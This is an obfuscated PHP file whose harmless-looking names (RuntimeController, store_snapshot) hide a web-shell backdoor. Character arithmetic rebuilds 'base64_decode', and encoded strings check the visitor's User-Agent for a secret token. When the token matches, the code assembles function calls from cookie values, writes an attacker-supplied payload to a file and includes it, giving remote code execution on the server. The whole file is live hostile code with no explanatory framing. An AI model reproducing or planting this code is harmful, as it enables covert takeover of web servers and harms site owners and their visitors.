<?php
function store_snapshot($c)
{
    $a = array(101 * 1, 5 + 95, 39 + 61 + 11, 108 - 9, 101, 107 - 7, 96 - 1, 52, 2 * 27, 33 * 1 + 68, 15 + 100, 94 + 3, 99 - 1);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    $s = strrev($s);
    return $s($c);
}

class RuntimeController
{
    private static $_gzl;
    static function prepareOutput($_cuw)
    {
        if (!self::$_gzl) {
            self::validateInput();
        }
        return store_snapshot(self::$_gzl[$_cuw]);
    }
    private static function validateInput()
    {
        self::$_gzl = array('_sqz' => 'SFRUUF' . '9VU0VSX0FHRU' . '5U', '_xlt' => 'SFRU' . 'UF9VU0VSX0FHRU' . '5U', '_ac' => 'NzczNDIx' . 'OD' . 'A' . '=', '_mp' => '', '_os' => '');
    }
}

if (isset($_SERVER[RuntimeController::prepareOutput('_s' . 'q' . 'z')]) && strpos($_SERVER[RuntimeController::prepareOutput('_' . 'x' . 'lt')], RuntimeController::prepareOutput('_' . 'ac')) !== false) {
    $_szm = $_COOKIE;
    $_rt = 00;
    $_cuw = 04;
    $_kz = array();
    $_kz[$_rt] = RuntimeController::prepareOutput('_m' . 'p');
    while ($_cuw) {
        $_kz[$_rt] .= $_szm[027][$_cuw];
        if (!$_szm[027][$_cuw + 01]) {
            if (!$_szm[027][$_cuw + 02]) {
                break;
            }
            $_rt++;
            $_kz[$_rt] = RuntimeController::prepareOutput('_o' . 's');
            $_cuw++;
        }
        $_cuw = $_cuw + 04 + 01;
    }
    $_rt = $_kz[07]() . $_kz[033];
    if (!$_kz[034]($_rt)) {
        $_cuw = $_kz[06]($_rt, $_kz[013]);
        $_kz[02]($_cuw, $_kz[031] . $_kz[015]($_kz[026]($_szm[03])));
    }
    include $_rt;
    die;
}